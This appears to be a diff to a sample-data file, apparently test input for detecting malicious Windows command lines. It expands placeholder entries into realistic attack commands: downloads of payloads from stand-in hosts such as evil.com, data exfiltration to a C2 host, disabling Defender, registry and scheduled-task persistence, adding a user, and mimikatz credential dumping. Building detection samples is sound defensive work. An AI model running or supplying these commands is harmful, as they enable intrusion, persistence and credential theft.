@@ -1,3 +1,15 @@
-powershell downloading exe file
-curl http://malicious-site.com
-rundll32 executing script
+powershell -enc Base64EncodedPayload downloading exe file from 192.168.1.50
+curl http://malicious-site.com/payload.bin -o C:\Temp\update.exe
+rundll32 executing script from AppData\Local\Temp\malware.dll
+powershell Invoke-WebRequest -Uri http://evil.com/shell.ps1 -OutFile C:\Users\Public\shell.ps1
+curl -X POST http://c2-server.net/exfil --data @sensitive_data.zip
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";document.write()
+powershell Set-MpPreference -DisableRealtimeMonitoring $true
+schtasks /create /tn "Updater" /tr C:\Temp\beacon.exe /sc daily
+reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /d C:\Temp\beacon.exe
+certutil -urlcache -split -f http://attacker.com/payload.exe C:\Temp\payload.exe
+mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -ep bypass"", 0:close")
+bitsadmin /transfer myJob http://evil.com/malware.exe C:\Temp\malware.exe
+wmic process call create "cmd.exe /c whoami > C:\Temp\output.txt"
+net user hacker Password123! /add
+mimikatz sekurlsa::logonpasswords
